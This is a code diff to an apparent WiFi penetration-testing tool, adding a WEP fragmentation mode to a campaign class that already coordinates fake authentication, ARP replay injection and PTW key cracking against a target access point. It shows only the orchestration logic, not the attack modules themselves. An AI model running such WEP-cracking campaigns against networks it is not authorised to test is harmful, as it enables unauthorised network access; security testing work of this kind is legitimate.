@@ -28,6 +28,7 @@ from typing import Callable, Optional
 from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
 from wifit3.engine.attacks.wep.arp_replay import WepArpReplay
+from wifit3.engine.attacks.wep.fragmentation import WepFragmentation
 from wifit3.engine.attacks.wep.crack import (
     PtwCracker,
     keystream_from_arp_cipher,
@@ -70,6 +71,11 @@ class WepCampaign:
         # GIL, so it can peg a core without slowing the replay (which lives on
         # the main process's event loop + GIL-releasing USB I/O).
         self._crack_pool: Optional[ProcessPoolExecutor] = None
+
+        # Frag/Chop are alternative "manufacture an ARP seed" sub-modes the
+        # user toggles while the campaign runs. The campaign owns the "one TX
+        # activity at a time" invariant by pausing replay around them.
+        self.frag: Optional[WepFragmentation] = None
 
         self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
         self.replay = WepArpReplay(
@@ -118,6 +124,11 @@ class WepCampaign:
             # worker process exit on its own.
             self._crack_pool.shutdown(wait=False, cancel_futures=True)
             self._crack_pool = None
+        # Tear down a running frag sub-mode before the TX it shares the radio
+        # with.
+        if self.frag is not None:
+            self.frag.stop()
+            self.frag = None
         # Stop replay (TX) before fake-auth so we don't briefly inject while
         # de-registering the forged STA.
         self.replay.stop()
@@ -168,6 +179,52 @@ class WepCampaign:
                     return
         except asyncio.CancelledError:
             pass
+
+    # ---- Fragmentation sub-mode --------------------------------------------
+
+    def start_frag(self) -> None:
+        """Switch to fragmentation: pause ARP replay (one TX activity at a time
+        on the half-duplex radio) and run WepFragmentation. On success it hands
+        back the AP's relayed ARP and we resume replay with the fresh seed; a
+        barren round just keeps retrying (the daemon logs a tally) until the
+        user stops or switches — never auto-stops."""
+        if not self._active or self.frag is not None:
+            return
+        self.replay.pause()
+        self.frag = WepFragmentation(
+            self.iface,
+            self.target,
+            self.iface.wep_store,
+            source_mac=self.fake_auth.source_mac,
+            on_forged_arp=self._on_frag_success,
+            can_inject=lambda: self.fake_auth.state == "associated",
+            log_callback=self._log,
+        )
+        self.frag.start()
+
+    def stop_frag(self) -> None:
+        """User-driven stop of the frag sub-mode → hand the radio back to ARP
+        replay (its locked-on seed, if any, survives)."""
+        if self.frag is None:
+            return
+        self.frag.stop()
+        self.frag = None
+        self.replay.resume()
+
+    def _on_frag_success(self, frame: bytes) -> None:
+        """Frag produced a relay (already an ARP-sized broadcast → the capture
+        store logged it as a replay seed). The daemon stopped itself; just drop
+        our handle and resume replay, which will pick the new seed up."""
+        self.frag = None
+        self._log(
+            "[green]→ Fragmentation seeded replay[/green] [dim](resuming ARP "
+            "replay with the AP's relayed ARP)[/dim]"
+        )
+        self.replay.resume()
+
+    @property
+    def frag_active(self) -> bool:
+        return self.frag is not None and self.frag.is_active
 
     @property
     def is_active(self) -> bool:
